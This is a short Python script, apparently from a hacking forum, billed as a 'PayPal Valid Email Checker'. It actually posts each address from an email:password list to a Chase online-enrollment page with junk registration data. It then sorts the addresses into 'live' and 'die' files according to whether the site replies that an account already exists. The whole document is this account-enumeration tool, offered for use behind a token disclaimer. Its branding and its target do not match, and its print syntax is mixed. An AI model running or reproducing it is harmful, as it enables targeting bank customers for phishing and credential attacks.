print("[+]PayPal Valid Email Checker by BL4CKP4N7H3R.PH[+]")
import requests
live = open('PayPalLive.txt', 'w')
die = open('PayPalDie.txt', 'w')
Checked = "Checked by BL4CKP4N7H3R.PH Valid Email Checker"
print("_"*50)
print"PayPal Valid Email Checker by BL4CKP4N7H3R.PH"
print"I dont't Accept any Responsibility for any illegal usage!"
print("_"*55)
print" "
list=raw_input("Input Mail List :")
link = "https://secure07b.chase.com/web/auth/enrollment#/enroll/onlineEnrollment/gettingStarted/index?LOB=RGBLogon"
head = {'User-agent':'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
s = requests.session()
g = s.get(link, headers=head)
list = open(list, 'r')
print("-"*55)
while True:
	email = list.readline().replace('\n','')
	if not email:
		break
	bacot = email.strip().split(':')
	xxx = {'customerName':'Androsex','email': bacot[0],'emailCheck': bacot[0],'password':'Kontol1337','passwordCheck':'Kontol1337'}
	cek = s.post(link, headers=head, data=xxx).text
	if "You indicated you are a new customer, but an account already exists with the e-mail" in cek:
		print("\033[32;1mLIVE\033[0m | "+email+" | [(Checked)]")
		live.write(email + '\n')
	else:
		print("\033[31;1mDIE\033[0m | "+email+" | [(Checked)]")
		die.write(email + '\n')
print("-"*50)
print("\033[35;1mProccess Checking Done\033[0m")
print("PayPal Valid Email was Saved in PayPalLive.txt")

